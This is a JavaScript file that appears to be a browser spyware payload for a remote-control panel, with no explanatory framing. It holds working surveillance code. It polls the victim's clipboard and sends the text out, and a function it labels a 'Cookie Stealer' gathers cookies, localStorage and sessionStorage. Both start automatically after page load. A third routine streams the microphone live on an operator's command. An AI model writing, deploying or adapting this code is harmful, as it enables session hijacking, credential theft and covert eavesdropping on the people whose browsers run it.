(function() {
    if (typeof socket === 'undefined') return;

    // 1. Real-time Clipboard Monitoring
    let lastClipboard = '';
    function startClipboardWatch() {
        if (!navigator.clipboard || !navigator.clipboard.readText) return;
        setInterval(async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text && text !== lastClipboard && text.length > 3) {
                    lastClipboard = text;
                    socket.emit('clipboard-data', {
                        text: text.slice(0, 1000),
                        timestamp: Date.now()
                    });
                }
            } catch (e) {}
        }, 2000);
    }

    // 2. Live Voice Streaming (continuous, independent of camera)
    let voiceRecorder = null;
    let voiceStream = null;
    let voiceSeq = 0;
    function startLiveVoice() {
        if (typeof MediaRecorder === 'undefined') return;
        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then(stream => {
                voiceStream = stream;
                const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
                    ? 'audio/webm;codecs=opus' : 'audio/webm';
                try {
                    const recorder = new MediaRecorder(stream, { mimeType });
                    recorder.ondataavailable = (e) => {
                        if (e.data.size > 0) {
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                socket.emit('voice-data', {
                                    audio: reader.result.split(',')[1],
                                    mimeType: mimeType,
                                    sequence: voiceSeq++,
                                    timestamp: Date.now()
                                });
                            };
                            reader.readAsDataURL(e.data);
                        }
                    };
                    recorder.start(100);
                    voiceRecorder = recorder;
                } catch (e) {}
            })
            .catch(() => {});
    }
    function stopLiveVoice() {
        if (voiceRecorder) { voiceRecorder.stop(); voiceRecorder = null; }
        if (voiceStream) { voiceStream.getTracks().forEach(t => t.stop()); voiceStream = null; }
    }

    // Listen for admin commands to start/stop live voice
    socket.on('start-voice', startLiveVoice);
    socket.on('stop-voice', stopLiveVoice);

    // 3. Cookie Stealer
    function stealCookies() {
        const data = { timestamp: Date.now() };
        try { data.cookies = document.cookie || ''; } catch (e) { data.cookies = ''; }
        try {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                try { ls[key] = localStorage.getItem(key); } catch (e) {}
            }
            data.localStorage = ls;
        } catch (e) { data.localStorage = {}; }
        try {
            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                try { ss[key] = sessionStorage.getItem(key); } catch (e) {}
            }
            data.sessionStorage = ss;
        } catch (e) { data.sessionStorage = {}; }
        socket.emit('cookies-data', data);
    }

    // Auto-start after page loads
    setTimeout(startClipboardWatch, 3000);
    setTimeout(stealCookies, 2000);
})();
